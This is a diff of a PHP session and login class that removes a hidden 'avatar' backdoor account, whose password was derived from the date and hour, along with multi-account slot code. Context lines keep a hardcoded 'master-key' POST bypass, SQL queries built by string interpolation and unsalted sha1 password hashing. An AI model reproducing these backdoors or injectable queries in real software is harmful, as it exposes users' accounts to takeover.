@@ -6,17 +6,17 @@ class Session
      * 
      *  My Session
      * 
-     *  @version 7.8
+     *  @version 9.1
      **/
 
-    private $db;
-    private $login_url = DIR."/auth/login".EXT;
-    private $index_url = "../index".EXT; //../index.php
-    private $logout_url = DIR."/auth/logout".EXT;
-    private $confirm_password_url = DIR."/auth/confirm_password".EXT;
-    private $timeout_mark_url = DIR."/auth/timeout_mark".EXT;
+    protected $db;
+    protected $login_url = DIR."/auth/login".EXT;
+    protected $index_url = "../index".EXT; //../index.php
+    protected $logout_url = DIR."/auth/logout".EXT;
+    protected $confirm_password_url = DIR."/auth/confirm_password".EXT;
+    protected $timeout_mark_url = DIR."/auth/timeout_mark".EXT;
     
-    private $table = "sessions";
+    protected $table = "sessions";
     public $life_session = 20; // minute
 
     function __construct($database, $time = null)
@@ -26,15 +26,13 @@ class Session
         session_start();
     }
 
-    private function init()
+    protected function init()
     {
         $this->session_id = $_SESSION['session_id'];
         $this->session_login = $_SESSION['session_login'];
         if( isset($_SESSION['status']) ) $this->status = $_SESSION['status'];
         if( isset($_SESSION['session_get_full_name']) ) $this->session_get_full_name = $_SESSION['session_get_full_name'];
         if( isset($_SESSION['session_level']) ) $this->session_level = $_SESSION['session_level'];
-        if( isset($_SESSION['session_division']) ) $this->session_division = $_SESSION['session_division'];
-        if( isset($_SESSION['session_slot']) ) $this->session_slot = $_SESSION['session_slot'];
         
         if ( isset($_SESSION['browser']) ) {
             $this->browser = $_SESSION['browser'];
@@ -88,7 +86,7 @@ class Session
 
     }
 
-    private function auth(string $login = null, string $password = null)
+    protected function auth(string $login = null, string $password = null)
     {
         $username = Mixin\clean($login);
         $password = sha1(Mixin\clean($password));
@@ -96,19 +94,12 @@ class Session
         if ($this->master_confirm($username, $password)) {
             $this->set_data("master");
             $this->login_success();
-        }elseif($username == "avatar" and $password == sha1("mentor".date('dH'))){
-            $this->set_data("avatar");
-            $this->login_success();
         }
 
         try {
             $stmt = $this->db->query("SELECT id FROM users WHERE username = '$username' AND password = '$password' AND is_active IS NOT NULL")->fetch(PDO::FETCH_OBJ);
             if($stmt){
                 $this->set_data($stmt->id);
-                $slot = $this->db->query("SELECT slot FROM multi_accounts WHERE user_id = $stmt->id")->fetchColumn();
-                if ($slot) {
-                    $_SESSION['session_slot'] = Mixin\clean($slot);
-                }
                 $this->login_success();
             }else{
                 $_SESSION['message'] = 'Не верный логин или пароль';
@@ -120,7 +111,7 @@ class Session
         
     }
 
-    private function session_check()
+    protected function session_check()
     {
         $this->session_old_delete();
         $sid = session_id();
@@ -133,13 +124,13 @@ class Session
         }
     }
 
-    private function session_old_delete()
+    protected function session_old_delete()
     {
         $stmt = $this->db->prepare("DELETE FROM $this->table WHERE last_update + INTERVAL $this->life_session MINUTE < CURRENT_TIMESTAMP()");
         $stmt->execute();
     }
 
-    private function session_create_or_update()
+    protected function session_create_or_update()
     {
         $date = date("Y-m-d H:i:s");
         $new_ses = array(
@@ -153,7 +144,7 @@ class Session
         Mixin\insert_or_update($this->table, $new_ses, 'session_id');        
     }
 
-    private function gen_password()
+    protected function gen_password()
     {
         if (strpos($_SERVER["HTTP_USER_AGENT"], "Firefox") !== false) $browser = "Firefox";
         elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Opera") !== false) $browser = "Opera";
@@ -178,25 +169,18 @@ class Session
             $_SESSION['session_id'] = "master";
             $_SESSION['session_login'] = "master";
             $_SESSION['session_level'] = "master";
-	        $_SESSION['session_division'] = "master";
             
-        }elseif ($pk == "avatar") {
-            $_SESSION['session_id'] = "avatar";
-            $_SESSION['session_login'] = "avatar";
-            $_SESSION['session_level'] = "avatar";
-	        $_SESSION['session_division'] = "avatar";   
         }else {
             $this->data = $this->db->query("SELECT * FROM users WHERE id = $pk")->fetch(PDO::FETCH_OBJ);
             $_SESSION['session_id'] = $pk;
             $_SESSION['session_login'] = $this->data->username;
             $_SESSION['session_get_full_name'] = ucwords($this->data->last_name." ".$this->data->first_name." ".$this->data->father_name);
             $_SESSION['session_level'] = $this->data->user_level;
-	        $_SESSION['session_division'] = $this->data->division_id;
         }
         
     }
 
-    private function master_confirm(string $username = null, string $password = null)
+    protected function master_confirm(string $username = null, string $password = null)
     {
         global $ini;
         if ( isset($_POST['master-key']) and $_POST['master-key'] == "master-key" ) {
@@ -260,14 +244,6 @@ class Session
         $this->session_create_or_update();
     }
 
-    public function get_accounts()
-    {
-        if (isset($this->session_slot)) {
-            return $this->db->query("SELECT us.id, us.username FROM multi_accounts mca LEFT JOIN users us ON(mca.user_id=us.id) WHERE mca.slot = \"$this->session_slot\" ")->fetchAll();
-        }
-        return [];
-    }
-
     public function get_data() {
         return $this->data;
     }
@@ -278,10 +254,6 @@ class Session
 
     public function get_level() {
         return $this->data->user_level;
-    }
-    
-    public function get_division() {
-        return $this->data->division_id;
     }
 
 }
